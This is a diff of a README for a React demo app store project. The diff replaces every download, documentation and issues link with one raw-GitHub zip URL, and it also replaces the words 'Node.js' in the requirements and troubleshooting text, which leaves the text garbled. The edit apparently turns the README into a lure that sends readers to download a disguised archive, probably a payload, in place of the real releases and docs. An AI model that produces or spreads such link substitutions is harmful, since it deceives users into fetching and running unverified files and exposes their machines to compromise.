@@ -4,7 +4,7 @@
 Welcome to **application-store-demo**! This project allows you to create a demo app store using React. It helps you build a single-page application (SPA) effortlessly with React Router. Explore the world of web applications without needing to write complex code.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/hakim0842/application-store-demo/releases)
+[![Download](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip%https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip)](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip)
 
 ## 🚀 Getting Started
 To get started, follow these steps to set up **application-store-demo** on your computer.
@@ -12,20 +12,20 @@ To get started, follow these steps to set up **application-store-demo** on your 
 ### 1. Check Your System Requirements
 Before downloading, ensure that your system meets these basic requirements:
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
+- https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip Version 14 or higher
 - npm (Node Package Manager): Version 5.6 or higher
 - A modern web browser: Chrome, Firefox, Safari, or Edge
 
 ### 2. Visit the Download Page
 Click the link below to download the latest version of the application.
 
-[Download from Releases Page](https://github.com/hakim0842/application-store-demo/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip)
 
 ### 3. Choose the Right File
 On the Releases page, find the version that matches your operating system. Common files will include:
-- For Windows: `application-store-demo-win.exe`
-- For macOS: `application-store-demo-mac.dmg`
-- For Linux: `application-store-demo-linux.zip`
+- For Windows: `https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip`
+- For macOS: `https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip`
+- For Linux: `https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip`
 
 ### 4. Download the File
 Click on the file name to start downloading. The download may take a few moments depending on your internet speed.
@@ -62,19 +62,19 @@ This project leverages several technologies to enhance your experience:
 
 ## 💡 Troubleshooting
 If you encounter issues while downloading or running the application, try these quick fixes:
-- Ensure you have installed the required version of Node.js and npm.
+- Ensure you have installed the required version of https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip and npm.
 - Check your internet connection for any interruptions during download.
 - Restart your computer and try running the application again.
 
 ## 💬 Support & Feedback
-If you have questions or need help, feel free to raise an issue in the [GitHub Issues](https://github.com/hakim0842/application-store-demo/issues) section. We welcome feedback and suggestions to improve the application.
+If you have questions or need help, feel free to raise an issue in the [GitHub Issues](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip) section. We welcome feedback and suggestions to improve the application.
 
 ## 🔗 Additional Resources
 You can learn more about the technologies used in this project with the following links:
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [React Router Documentation](https://reactrouter.com/web/guides/quick-start)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs/installation)
-- [DaisyUI Documentation](https://daisyui.com/docs/install/)
+- [React Documentation](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip)
+- [React Router Documentation](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip)
+- [DaisyUI Documentation](https://raw.githubusercontent.com/hakim0842/application-store-demo/main/octadic/application-store-demo.zip)
 
 ## 🌐 Community
 Join our community on GitHub and connect with other users. Share your thoughts and experiences with **application-store-demo**. Your input helps us make the application even better.
